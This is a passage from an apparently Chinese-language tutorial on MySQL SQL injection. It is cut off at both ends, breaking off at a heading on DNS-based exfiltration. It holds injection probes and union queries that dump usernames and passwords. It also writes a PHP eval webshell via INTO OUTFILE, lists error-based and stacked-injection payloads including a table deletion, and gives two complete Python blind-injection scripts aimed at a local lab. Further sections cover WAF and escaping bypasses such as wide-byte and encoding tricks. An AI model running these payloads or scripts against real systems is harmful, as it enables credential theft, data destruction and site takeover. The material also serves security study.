<pre><code>USER()
SYSTEM_USER()
SESSION_USER()
CURRENT_USER()</code></pre>
</li>
<li><p>当前数据库</p>
<pre><code>DATABASE()
SCHEMA()</code></pre>
</li>
<li><p>路径</p>
<pre><code>@@BASEDIR : mysql安装路径：
@@SLAVE_LOAD_TMPDIR : 临时文件夹路径：
@@DATADIR : 数据存储路径：
@@CHARACTER_SETS_DIR : 字符集设置文件路径
@@LOG_ERROR : 错误日志文件路径：
@@PID_FILE : pid-file文件路径
@@BASEDIR : mysql安装路径：
@@SLAVE_LOAD_TMPDIR : 临时文件夹路径</code></pre>
</li>
</ul>
<h4 id="2、常用函数"><a href="#2、常用函数" class="headerlink" title="2、常用函数"></a>2、常用函数</h4><h5 id="联合函数"><a href="#联合函数" class="headerlink" title="联合函数"></a>联合函数</h5><pre><code>CONCAT()
GROUP_CONCAT()
CONCAT_WS()</code></pre>
<h5 id="数字-字符-字符串"><a href="#数字-字符-字符串" class="headerlink" title="数字/字符/字符串"></a>数字/字符/字符串</h5><pre><code>ASCII(): 获取字母的ascii码值
BIN(): 返回值的二进制串表示
CONV(): 进制转换
FLOOR()：向下取整
ROUND()：舍入到最接近的整数
LOWER()：转成小写字母
UPPER(): 转成大写字母
HEX():十六进制编码
UNHEX()：十六进制解码

MID()：从文本字段中提取字符
LEFT()：从左侧截取字符串
SUBSTR()：截取字符串
SUBSTRING()：截取字符串</code></pre>
<h5 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h5><pre><code>行间注释
xxx-- -(--后面有个空格)
xxx;--
xxx#
xxx;#
` (反引号)

行内注释
/* */
+xx/* 内容 */xx;
/*! 语句 */
/*! select * from test */
语句会被执行</code></pre>
<h3 id="注入基础"><a href="#注入基础" class="headerlink" title="注入基础"></a>注入基础</h3><h4 id="1、判断注入存在"><a href="#1、判断注入存在" class="headerlink" title="1、判断注入存在"></a>1、判断注入存在</h4><ul>
<li><p>数字型</p>
<pre><code>?id=1+1#
?id=-1 or 1=1#
?id=-1 or 10-2=8#
?id=1 and 1=2#
?id=1 and 1=1#</code></pre>
</li>
<li><p>字符型</p>
<p>参数被引号或括号包围，我们需要闭合引号或括号。</p>
<pre><code>?id=1&#39;#
?id=1&quot;#
?id=1&#39;)#
?id=1)#
?id=1&#39; and &#39;1&#39;=&#39;1#
?id=1&#39; and &#39;1&#39;=&#39;2#</code></pre>
</li>
</ul>
<h4 id="2、order-by"><a href="#2、order-by" class="headerlink" title="2、order by"></a>2、order by</h4><p>ORDER BY 关键词用于对记录集中的数据进行排序。</p>
<p>在存在注入的情况下我们可以利用<code>order by</code>子句进行快速猜解列数，再配合<code>union select</code>语句进行回显。</p>
<pre><code>?id=1&#39; order by 3#(正确)
?id=1&#39; order by 4#(错误)
列数为3</code></pre>
<p>当然通过<code>order by</code>判断出来的列数不一定就是该表中的全部列数，而是该sql语句查询的列个数，如果使用的<code>select * from xx</code>查询的话就可以通过<code>order by</code>得知表的列数。</p>
<h4 id="3、union查询"><a href="#3、union查询" class="headerlink" title="3、union查询"></a>3、union查询</h4><p>MySQL UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合中。</p>
<p>通过union操作符我们可以在闭合当前查询语句后拼接一个我们可控的查询语句来查询并带出数据。</p>
<pre><code class="mysql">mysql&gt; select * from users where id=&#39;1&#39;;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
1 row in set (0.00 sec)

mysql&gt; select * from users where id=&#39;1&#39; union select 1,&#39;aa&#39;,&#39;lanvnal&#39;;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
|  1 | aa       | lanvnal  |
+----+----------+----------+
2 rows in set (0.00 sec)</code></pre>
<p>通常页面只会显示查询的第一个结果，可以通过控制查询条件使原查询的结果为空。</p>
<h4 id="4、limit用法"><a href="#4、limit用法" class="headerlink" title="4、limit用法"></a>4、limit用法</h4><pre><code>SELECT * FROM ids LIMIT a,b</code></pre>
<p>LIMIT后的第一个参数是输出记录的初始位置，第二个参数偏移量，偏移多少，输出的条目就是多少。</p>
<pre><code>SELECT * FROM ids LIMIT 10 OFFSET 2</code></pre>
<p>OFFSET与逗号隔开基本是一样的，唯一的差别就是两个参数的位置前后颠倒了一下。</p>
<h4 id="5、查库-表-列名"><a href="#5、查库-表-列名" class="headerlink" title="5、查库/表/列名"></a>5、查库/表/列名</h4><pre><code>查数据库名：select database() 
查询所有数据库名： select group_concat(schema_name) from INFORMATION_SCHEMA.SCHEMATA
查询数据库中所有表：select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479
查users表名下的列名信息：union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x75736572
查users表名下列名username,password的数据：
union select 1,username,password from user
union select 1,group_concat(username,password),3 from users

===============
information_schema.tables：存储mysql数据库下面的所有表名信息的表
information_schema.columns ：存储mysql数据库下面的所有列名信息的表
table_schema：数据库名
Table_name：表名
column_name：列名</code></pre>
<h4 id="6、文件操作"><a href="#6、文件操作" class="headerlink" title="6、文件操作"></a>6、文件操作</h4><blockquote>
<p>条件：</p>
<p>需要有读取文件的权限</p>
<p>需要知道绝对物理路径</p>
<p>文件大小小于max_allowed_packet</p>
</blockquote>
<p>load_file()</p>
<pre><code>load_file(&quot;/tmp/test.txt”)
load_file(char(68,58,92,116,101,115,116,46,116,120,116))
load_file(0x443A2F2F746573742E747874)</code></pre>
<p>导出数据</p>
<pre><code>select database() into outfile “/var/www/html/1.txt&quot;
select &quot;&lt;?php eval($_POST[&#39;LANVNAL&#39;])?&gt;&quot; into outfile &#39;/var/www/html/shell.php&#39;</code></pre>
<h4 id="7、报错语句"><a href="#7、报错语句" class="headerlink" title="7、报错语句"></a>7、报错语句</h4><pre><code>1、通过UpdateXml报错,注入语句如下:
uname=1&#39;and 1=(updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where id=4)),1))
?id=1 and 1=(updatexml(1,(make_set(3,&#39;~&#39;,(database()))),1)) 

2、通过floor报错,注入语句如下:
uname=1&#39;and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);

3、通过ExtractValue报错,注入语句如下:
uname=1&#39;and extractvalue(1, concat(0x5c, (select group_concat(table_name) from information_schema.tables where table_schema=database())))

4、通过NAME_CONST报错,注入语句如下:
name_const(name,value)函数会用传入的参数返回一列结果集.传入的参数必须是常量
uname=1&#39;and exists(select * from (select * from(select name_const(version(),0))a join (select name_const(version(),0))b)c)—+

5.通过join报错爆字段
注：该方法在知道表名的情况下使用
select * from (select * from 表名 a join 表名 b) c
在得到一个字段后，使用using得到下一个字段
select * from (select * from 表名 a join 表名 b using (已知的字段,已知的字段)) c  

6.通过exp报错
uname=1&#39;and exp(~(select * from (select user() ) a) )

7.通过GeometryCollection()报错
uname=1&#39;and geometrycollection((select * from(select * from(select database())a)b)) --+

8.通过polygon()报错
uname=1&#39;and polygon((select * from(select * from(select database())a)b)) --+

9.通过multipoint()报错
uname=1&#39;and multipoint((select * from(select * from(select database())a)b)) --+

10.通过multlinestring()报错
uname=1&#39;and multilinestring((select * from(select * from(select database())a)b)) --+

11.通过multpolygon()报错
uname=1&#39;and multipolygon((select * from(select * from(select database())a)b)) —+

12.通过linestring()报错
uname=1&#39;and linestring((select * from(select * from(select database())a)b))--+</code></pre>
<h4 id="8、堆叠注入-Stacked-injections"><a href="#8、堆叠注入-Stacked-injections" class="headerlink" title="8、堆叠注入(Stacked injections)"></a>8、堆叠注入(Stacked injections)</h4><p>从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在 mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked  injection。<br><strong>原理：</strong><br>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：<code>1; DELETE FROM products</code>服务器端生成的sql语句为：<code> Select * from products where productid=1;DELETE FROM products</code>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。<br><strong>局限性：</strong><br>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
<h4 id="9、盲注"><a href="#9、盲注" class="headerlink" title="9、盲注"></a>9、盲注</h4><p>盲注的本质是猜解。</p>
<p>我们想实现的是我们要构造一条语句来测试我们输入的<strong>布尔表达式</strong>，使得布尔表达式结果的真假直接影响整条语句的执行结果，从而使得系统有不同的反应，在时间盲注中是不同的返回的时间，在布尔盲注中则是不同的页面反应。</p>
<p>bool盲注脚本：</p>
<pre><code class="python">#!/usr/bin/python3
import requests
import string
import sys
global findBit
import binascii

Flag_yes = &quot;You are in&quot;
def sendPayload(payload):
    url = &#39;http://127.0.0.1:8001/Less-5/?id=1&#39;+ payload
    content = requests.get(url).text
    return content
def findDatabaseNumber():
    count = 1
    while count:
        payload = &quot;&#39;AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) =&quot;
        payload = payload + str(count) + &quot;--+&quot;
        recv = sendPayload(payload)
        if Flag_yes in recv:
            return count
        else:
            count += 1
def findTableNumber(dbname):
    count = 1
    dbname = &#39;0x&#39; + bytes.decode(binascii.hexlify(str.encode(dbname)))
    while count:
        payload = &quot;&#39;AND (select count(table_name) from information_schema.tables where table_schema=&quot;+dbname+&quot;) =&quot;
        payload = payload + str(count) + &quot;--+&quot;
        recv = sendPayload(payload)
        if Flag_yes in recv:
            return count
        else:
            count += 1
def findColumnNumber(tableName):
    count = 1
    tableName = &#39;0x&#39; + bytes.decode(binascii.hexlify(str.encode(tableName)))
    while count:
        payload = &quot;&#39;AND (select count(column_name) from information_schema.columns where table_name=&quot;+tableName+&quot;) =&quot;
        payload = payload + str(count) + &quot;--+&quot;
        recv = sendPayload(payload)
        if Flag_yes in recv:
            return count
        else:
            count += 1
def findDataNumber(columnName,tableName):
    count = 1
    while count:
        payload = &quot;&#39;AND (select count(&quot;+columnName+&quot;) from &quot;+tableName+&quot;) =&quot;
        payload = payload + str(count) + &quot;--+&quot;
        recv = sendPayload(payload)
        if Flag_yes in recv:
            return count
        else:
            count += 1


def getDatabaseName(dbNum):
    global findBit
    for k in range(dbNum):
        i = 1
        while i :
            findBit = 0
            doubleSearchDbs(-1,255,i,k)
            i += 1
            if findBit == 1:
                sys.stdout.write(&quot;`\r\n&quot;)
                break
def getTableName(tableNum,dbName):
    global findBit
    dbName = &#39;0x&#39; + bytes.decode(binascii.hexlify(str.encode(dbName)))
    for k in range(tableNum):
        i = 1
        while i :
            findBit = 0
            doubleSearchTable(-1,255,i,k,dbName)
            i += 1
            if findBit == 1:
                sys.stdout.write(&quot;\r\n&quot;)
                break
def getColumnName(columnNum,tableName):
    global findBit
    tableName = &#39;0x&#39; + bytes.decode(binascii.hexlify(str.encode(tableName)))
    for k in range(columnNum):
        i = 1
        while i :
            findBit = 0
            doubleSearchColumn(-1,255,i,k,tableName)
            i += 1
            if findBit == 1:
                sys.stdout.write(&quot;\r\n&quot;)
                break
def getDataName(dataNum,columnName,tableName):
    global findBit
    for k in range(dataNum):
        i = 1
        while i :
            findBit = 0
            doubleSearchData(-1,255,i,k,columnName,tableName)
            i += 1
            if findBit == 1:
                sys.stdout.write(&quot;\r\n&quot;)
                break
def doubleSearchDbs(leftNum,rightNum,i,k):
    global findBit
    midNum = (leftNum + rightNum) / 2
    if (rightNum != leftNum +1):
        querysql = &quot;&#39;AND ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT &quot; + str(k) + &quot;,1),&quot; + str(i) + &quot;,1)) &gt; &quot; + str(midNum) + &quot;--+&quot;
        recv = sendPayload(querysql)
        if Flag_yes in recv:
            doubleSearchDbs(midNum,rightNum,i,k)
        else:
            doubleSearchDbs(leftNum,midNum,i,k)
    else:
        if rightNum != 0:
            sys.stdout.write(chr(int(rightNum)))
            sys.stdout.flush()
        else:
            findBit = 1
            return
def doubleSearchTable(leftNum,rightNum,i,k,dbName):
    global findBit
    midNum = (leftNum + rightNum) / 2
    if (rightNum != leftNum +1):
        querysql = &quot;&#39;AND ASCII(substr((SELECT table_name  FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=&quot;+ dbName+&quot; limit &quot; + str(k) + &quot;,1),&quot; + str(i) + &quot;,1)) &gt; &quot; + str(midNum) + &quot;--+&quot;
        recv = sendPayload(querysql)
        if Flag_yes in recv:
            doubleSearchTable(midNum,rightNum,i,k,dbName)
        else:
            doubleSearchTable(leftNum,midNum,i,k,dbName)
    else:
        if rightNum != 0:
            sys.stdout.write(chr(int(rightNum)))
            sys.stdout.flush()
        else:
            findBit = 1
            return
def doubleSearchColumn(leftNum,rightNum,i,k,tableName):
    global findBit
    midNum = (leftNum + rightNum) / 2
    if (rightNum != leftNum +1):
        querysql = &quot;&#39;AND ascii(substr((SELECT column_name FROM INFORMATION_SCHEMA.columns WHERE TABLE_name=&quot;+ tableName+&quot; limit &quot; + str(k) + &quot;,1),&quot; + str(i) + &quot;,1)) &gt; &quot; + str(midNum) + &quot;--+&quot;
        recv = sendPayload(querysql)
        if Flag_yes in recv:
            doubleSearchColumn(midNum,rightNum,i,k,tableName)
        else:
            doubleSearchColumn(leftNum,midNum,i,k,tableName)
    else:
        if rightNum != 0:
            sys.stdout.write(chr(int(rightNum)))
            sys.stdout.flush()
        else:
            findBit = 1
            return
def doubleSearchData(leftNum,rightNum,i,k,columnName,tableName):
    global findBit
    midNum = (leftNum + rightNum) / 2
    if (rightNum != leftNum +1):
        querysql = &quot;&#39;AND ascii(substr((SELECT &quot;+ columnName+&quot; from &quot; +tableName + &quot; limit &quot; + str(k) + &quot;,1),&quot; + str(i) + &quot;,1)) &gt; &quot; + str(midNum) + &quot;--+&quot;
        recv = sendPayload(querysql)
        if Flag_yes in recv:
            doubleSearchData(midNum,rightNum,i,k,columnName,tableName)
        else:
            doubleSearchData(leftNum,midNum,i,k,columnName,tableName)
    else:
        if rightNum != 0:
            sys.stdout.write(chr(int(rightNum)))
            sys.stdout.flush()
        else:
            findBit = 1
            return
def exp():
    dbNum = findDatabaseNumber()
    print (&quot;the number of database is &quot;+str(dbNum))
    getDatabaseName(dbNum)
    dbName = input(&#39;Find tables from :&#39;)
    tableNum = findTableNumber(dbName)
    print (&quot;the nameber of table is: &quot; + str(tableNum))
    getTableName(tableNum,dbName)
    tableName = input(&#39;Find columns from :&#39;)
    columnNum = findColumnNumber(tableName)
    print (&quot;the number of column is: &quot; + str(columnNum))
    getColumnName(columnNum,tableName)
    columnName = input(&#39;Find data from :&#39;)
    dataNum = findDataNumber(columnName,tableName)
    print (&quot;the number of data is :&quot; + str(dataNum))
    getDataName(dataNum,columnName,tableName)
exp()
</code></pre>
<p>时间型盲注脚本：</p>
<pre><code class="python">#!/usr/bin/python3
import requests
import string
import sys
global findBit
import binascii
import time

Flag_yes = &quot;You are in&quot;
s = r&#39;,0123456789abcdefghijklmnopqrstuvwxyz&#39;
url = &#39;http://127.0.0.1:8001/Less-9/?id=1\&#39;&#39;

def sendPayload(payload):
    url = &#39;http://127.0.0.1:8001/Less-9/?id=1\&#39;&#39;+ payload
    #print (url)
    content = requests.get(url).text
    return content

def check(payload):
    url_new = url + payload
    time_start = time.time()
    content = requests.get(url=url_new)
    time_end = time.time()
    if time_end - time_start &gt;3:
        return 1

def getDbNameLength():
    length = &#39;&#39;
    for i in range(1,3):
        for c in range(10):
            payload = &quot;and if(substr(length(database()),%d,1)=&#39;%d&#39;,sleep(3),1)--+&quot; % (i,c)
            if check(payload):
                length += str(c)
                print (length)
    sys.stdout.write(&quot;`\r\n&quot;)
    return int(length)

def getTableLength(dbname):
    length = &#39;&#39;
    dbname = &#39;0x&#39; + bytes.decode(binascii.hexlify(str.encode(dbname)))
    for i in range(1,3):
        for c in range(10):
            payload = &quot;and if(substr(length((select group_concat(table_name) from information_schema.tables where table_schema=&#123;&#125;)),&#123;&#125;,1)=&#39;&#123;&#125;&#39;,sleep(3),1)--+&quot;.format(dbname,i,c)
            if check(payload):
                length += str(c)
                print (length)
    sys.stdout.write(&quot;`\r\n&quot;)
    return int(length)

def getColumnsLength(tbname):
    length = &#39;&#39;
    tbname = &#39;0x&#39; + bytes.decode(binascii.hexlify(str.encode(tbname)))
    for i in range(1,3):
        for c in range(10):
            payload = &quot;and if(substr(length((select group_concat(column_name) from information_schema.columns where table_name=&#123;&#125;)),&#123;&#125;,1)=&#39;&#123;&#125;&#39;,sleep(3),1)--+&quot;.format(tbname,i,c)
            if check(payload):
                length += str(c)
                print (length)
    sys.stdout.write(&quot;`\r\n&quot;)
    return int(length)

def getDataLength(colName,tbName):
    length = &#39;&#39;
    for i in range(1,3):
        for c in range(10):
            payload = &quot;and if(substr(length((select group_concat(&#123;&#125;) from &#123;&#125;)),&#123;&#125;,1)=&#39;&#123;&#125;&#39;,sleep(3),1)--+&quot;.format(colName,tbName,i,c)
            if check(payload):
                length += str(c)
                print (length)
    sys.stdout.write(&quot;`\r\n&quot;)
    return int(length)

def getDatabaseName(dbLength):
    result = &#39;&#39;
    for i in range(1,dbLength + 1):
        for c in s:
            payload = &quot;and if(substr(database(),%d,1)=&#39;%c&#39;,sleep(3),1)--+&quot; % (i,c)
            if check(payload):
                result += c
                break
        print (result)
    sys.stdout.write(&quot;`\r\n&quot;)

def getTablesName(dbName,tbLength):
    result = &#39;&#39;
    dbName = &#39;0x&#39; + bytes.decode(binascii.hexlify(str.encode(dbName)))
    for i in range(1,tbLength+1):
        for c in s:
            payload = &quot;and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#123;&#125;),&#123;&#125;,1)=&#39;&#123;&#125;&#39;,sleep(3),1)--+&quot;.format(dbName,i,c)
            if check(payload):
                result += c
                break
        print (result)
    sys.stdout.write(&quot;`\r\n&quot;)

def getColumnsName(tbName,coLength):
    result = &#39;&#39;
    tbName = &#39;0x&#39; + bytes.decode(binascii.hexlify(str.encode(tbName)))
    for i in range(1,coLength+1):
        for c in s:
            payload = &quot;and if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#123;&#125;),&#123;&#125;,1)=&#39;&#123;&#125;&#39;,sleep(3),1)--+&quot;.format(tbName,i,c)
            if check(payload):
                result += c
                break
        print (result)
    sys.stdout.write(&quot;`\r\n&quot;)

def getDatas(colName,tbName,dataLength):
    result = &#39;&#39;
    for i in range(1,dataLength+1):
        for c in s:
            payload = &quot;and if(substr((select group_concat(&#123;&#125;) from &#123;&#125;),&#123;&#125;,1)=&#39;&#123;&#125;&#39;,sleep(3),1)--+&quot;.format(colName,tbName,i,c)
            if check(payload):
                result += c
                break
        print (result)
    sys.stdout.write(&quot;`\r\n&quot;)


def exp():
    dbLength = getDbNameLength()
    print (&quot;database_name&#39;s length:&#123;&#125;&quot;.format(dbLength))
    getDatabaseName(dbLength)
    dbname = input(&#39;Find tables from :&#39;)
    tbLength = getTableLength(dbname)
    print (&quot;Tables_name&#39;s length:&#123;&#125;&quot;.format(tbLength))
    getTablesName(dbname,tbLength)
    tbname = input(&#39;Find columns from :&#39;)
    coLength = getColumnsLength(tbname)
    print (&quot;columns_name&#39;s length:&#123;&#125;&quot;.format(coLength))
    getColumnsName(tbname,coLength)
    colname = input(&#39;Find datas from :&#39;)
    dataLength = getDataLength(colname,tbname)
    print (&quot;data&#39;s length:&#123;&#125;&quot;.format(dataLength))
    getDatas(colname,tbname,dataLength)
exp()
</code></pre>
<h3 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h3><h4 id="1、绕过空格过滤"><a href="#1、绕过空格过滤" class="headerlink" title="1、绕过空格过滤"></a>1、绕过空格过滤</h4><p><strong>a.使用注释符</strong></p>
<pre><code>/**/替代空格</code></pre>
<p><strong>b.如果过滤了空格和注释符</strong></p>
<pre><code>function blacklist($id)
&#123;
    $id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id);            //strip out OR (non case sensitive)
    $id= preg_replace(&#39;/and/i&#39;,&quot;&quot;, $id);        //Strip out AND (non case sensitive)
    $id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);        //strip out /*
    $id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);        //Strip out --
    $id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);            //Strip out #
    $id= preg_replace(&#39;/[\s]/&#39;,&quot;&quot;, $id);        //Strip out spaces
    $id= preg_replace(&#39;/[\/\\\\]/&#39;,&quot;&quot;, $id);        //Strip out slashes
    return $id;
&#125;</code></pre>
<p><strong>c.可以使用特殊中文字符 %a0</strong></p>
<pre><code>id=1&#39;%a0union%a0select%a01,user(),3%a0and%a0&#39;1&#39;=&#39;1</code></pre>
<p>这个可算是一个不成汉字的中文字符了，因为%a0的特性，在进行正则匹配时，匹配到它时是识别为中文字符的，所以不会被过滤掉，但是在进入SQL语句后，Mysql是不认中文字符的，所以直接当作空格处理，就这样，我们便达成了Bypass的目的，成功绕过空格+注释的过滤。</p>
<p><strong>d.中文字符配合注释符</strong></p>
<pre><code>union/*%aa*/select。
这个不是属于/*xxx*/应该是被防护了的怎么还可以呢？这是中文字符的特性利用，中文字符配合注释符bypass 。利用%e4等只要是中文字符开头的，就可以完成绕过检测！</code></pre>
<p><strong>e.使用括号</strong></p>
<pre><code>seleCt (group_concat(table_name)) from (information_schema.tables) where (table_schema=database())) </code></pre>
<p><strong>f.使用反引号</strong></p>
<pre><code>select `database()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用</code></pre>
<h4 id="2、绕过黑名单过滤"><a href="#2、绕过黑名单过滤" class="headerlink" title="2、绕过黑名单过滤"></a>2、绕过黑名单过滤</h4><p><strong>a .双写绕过</strong></p>
<p>waf将关键字过滤了的情况。</p>
<pre><code>$id= preg_replace(&#39;/UNION/s&#39;,&quot;&quot;, $id); //Strip out UNION</code></pre>
<p><strong>b.大小写绕过</strong></p>
<p>用于大小写不敏感的过滤。</p>
<pre><code>$id= str_replace(&#39;union&#39;,&#39;&#39;, $id);</code></pre>
<p><strong>c.and/or的过滤</strong></p>
<pre><code>and =&gt; &amp;&amp;
or =&gt; ||</code></pre>
<p><strong>d.等号/比较符的过滤</strong></p>
<pre><code>?id=1&#39; or 1 like 1#   绕过对 = &gt; 等过滤
or &#39;1&#39; IN (&#39;1234&#39;)#   替代=</code></pre>
<p><strong>e.过滤了注释符</strong></p>
<p>闭合前后引号。</p>
<pre><code>$reg = &quot;/#/&quot;;
$reg1 = &quot;/--/&quot;;
$replace = &quot;&quot;;
$id = preg_replace($reg, $replace, $id);
$id = preg_replace($reg1, $replace, $id);

$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></pre>
<pre><code>id=-1&#39; or &#39;1&#39;=&#39;1
id=-1&#39; union select 1,database(),&#39;3</code></pre>
<p><strong>f.函数被过滤</strong></p>
<pre><code>等价替换：
hex()、bin() ==&gt; ascii()
sleep() ==&gt;benchmark()
concat_ws()==&gt;group_concat()
mid()、substr() ==&gt; substring()

逐位比较：
substring()和substr()被过滤：
?id=1 and ascii(lower(mid((select pwd from users limit 1,1),1,1)))=74
substr((select &#39;password&#39;),1,1) = 0x70
strcmp(left(&#39;password&#39;,1), 0x69) = 1
strcmp(left(&#39;password&#39;,1), 0x70) = 0
strcmp(left(&#39;password&#39;,1), 0x71) = -1</code></pre>
<p><strong>g.过滤了union/where/limit</strong></p>
<p>每次取一个值比较。</p>
<pre><code>id=1 &amp;&amp; (select user from users where id=1)=&#39;admin&#39;
id=1 &amp;&amp; (select user from users limit 1) = &#39;admin&#39;
id=1 &amp;&amp; (select user from users group by user_id having user_id = 1) = &#39;admin&#39;</code></pre>
<h4 id="3、绕过addslashes-函数"><a href="#3、绕过addslashes-函数" class="headerlink" title="3、绕过addslashes()函数"></a>3、绕过addslashes()函数</h4><p>可以用宽字节来绕过。</p>
<p>mysql在使用GBK编码的时候，会认为两个字符为一个汉字，例如%aa%5c就是一个汉字（前一个ascii码大于128才能到汉字的范围）。原理大概来说就是，一个双字节组成的字符，比如一个汉字‘我’的utf8编码为%E6%88%91 当我们使用?id=-1%E6’ 这样的构造时，’ 前面加的 \ 就会和%E6 合在一起，但是又不是一个正常汉字，但是起到了注掉 \ 的作用</p>
<blockquote>
<p> addslashes()会在单引号前加一个\ 来转义引号。</p>
</blockquote>
<p>绕过方法：</p>
<p>1、宽字节使\拼接成中文字符造成转移失效</p>
<p>2、构造 %**%5c%5c%27的情况，后面的%5c会被前面的%5c给注释掉。</p>
<h4 id="4、绕过mysql-real-escape-string-函数"><a href="#4、绕过mysql-real-escape-string-函数" class="headerlink" title="4、绕过mysql_real_escape_string()函数"></a>4、绕过mysql_real_escape_string()函数</h4><p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</p>
<p>下列字符受影响：</p>
<pre><code>\x00
\n
\r
\
&#39;
&quot;
\x1a</code></pre>
<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p>
<p>可用<strong>宽字节</strong>绕过。</p>
<h4 id="5、编码绕过"><a href="#5、编码绕过" class="headerlink" title="5、编码绕过"></a>5、编码绕过</h4><p>在引号或特定词被过滤时，使用urlencode，ascii(char)，hex，unicode等编码绕过</p>
<pre><code>or 1=1                    =&gt;        %6f%72%20%31%3d%31
/tmp/test.txt        =&gt;        char(68,58,92,116,101,115,116,46,116,120,116)

十六进制
security                =&gt;        0x7365637572697479

双重编码
?id=1%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a*/FROM%252f%252a*/Users--+

unicode编码
单引号：&#39;
%u0027 %u02b9 %u02bc %u02c8 %u2032
%uff07 %c0%27
%c0%a7 %e0%80%a7
空白：
%u0020 %uff00
%c0%20 %c0%a0 %e0%80%a0
左括号(:
%u0028 %uff08
%c0%28 %c0%a8
%e0%80%a8
右括号):
%u0029 %uff09
%c0%29 %c0%a9
%e0%80%a9</code></pre>
<h3 id="进阶技巧"><a href="#进阶技巧" class="headerlink" title="进阶技巧"></a>进阶技巧</h3><h4 id="1、order-by的妙用"><a href="#1、order-by的妙用" class="headerlink" title="1、order by的妙用"></a>1、order by的妙用</h4><p>登陆场景：</p>
<pre><code class="php">$username = $_POST[&#39;username&#39;];
$password = $_POST[&#39;password&#39;];
if(filter($username))&#123;
    //过滤括号
&#125;else&#123;
    $sql=&quot;SELECT * FROM admin WHERE username=&#39;&quot;.$username.&quot;&#39;&quot;;
    $result=mysql_query($sql);
    @$row = mysql_fetch_array($result);
    if(isset($row) &amp;&amp; $row[&#39;username&#39;] === &#39;admin&#39;)&#123;
        if ($row[&#39;password&#39;]===md5($password))&#123;
            //Login successful
        &#125;else&#123;
            die(&quot;password error!&quot;);
        &#125;
    &#125;else&#123;
        die(&quot;username does not exist!&quot;);
    &#125;
&#125;</code></pre>
<pre><code>mysql&gt; select * from users where username=&#39;admin6&#39;;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  18 | admin6   | 51b7a76d51e70b419f60d3473fb6f900 |
+----+----------+----------------------------------+
1 row in set (0.00 sec)</code></pre>
<p>通过<strong>order by盲注</strong>获取password的值。</p>
<pre><code>mysql&gt; select * from users where username=&#39;admin6&#39; union select 1,2,&#39;5&#39; order by 3;
+----+----------+----------------------+
| id | username | password             |
+----+----------+----------------------+
|  1 | 2        | 5                    |
| 18 | admin6   | 51b7a76d51e70b419f60 |
+----+----------+----------------------+
2 rows in set (0.00 sec)

mysql&gt; select * from users where username=&#39;admin6&#39; union select 1,2,&#39;6&#39; order by 3;
+----+----------+----------------------+
| id | username | password             |
+----+----------+----------------------+
| 18 | admin6   | 51b7a76d51e70b419f60 |
|  1 | 2        | 6                    |
+----+----------+----------------------+
2 rows in set (0.00 sec)

mysql&gt; select * from users where username=&#39;admin6&#39; union select 1,2,&#39;51&#39; order by 3;
+----+----------+----------------------+
| id | username | password             |
+----+----------+----------------------+
|  1 | 2        | 51                   |
| 18 | admin6   | 51b7a76d51e70b419f60 |
+----+----------+----------------------+
2 rows in set (0.00 sec)

mysql&gt; select * from users where username=&#39;admin6&#39; union select 1,2,&#39;52&#39; order by 3;
+----+----------+----------------------+
| id | username | password             |
+----+----------+----------------------+
| 18 | admin6   | 51b7a76d51e70b419f60 |
|  1 | 2        | 52                   |
+----+----------+----------------------+
2 rows in set (0.00 sec)</code></pre>
<p>通过上面的查询可以发现，按照password列排序时，字符的大小影响着他们的位置。通过调整我们设置的字符，找出回显内容变换的时刻来确定这一位的字符。</p>
<h4 id="2、FUZZ"><a href="#2、FUZZ" class="headerlink" title="2、FUZZ"></a>2、FUZZ</h4><p>通过Burpsuite的Intruder模块来跑一遍FUZZ脚本，有助于确定注入点和闭合符号。</p>
<p>附上几个FUZZ字典：</p>
<blockquote>
<p><a href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a></p>
<p><a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p>
</blockquote>
<h4 id="3、在盲注中使用-DNS-进行外带"><a href="#3、在盲注中使用-DNS-进行外带" class="headerlink" title="3、在盲注中使用 DNS 进行外带"></a>3、在盲注中使用 DNS 进行外带</h4><blockquote>
<p>限制：</p>
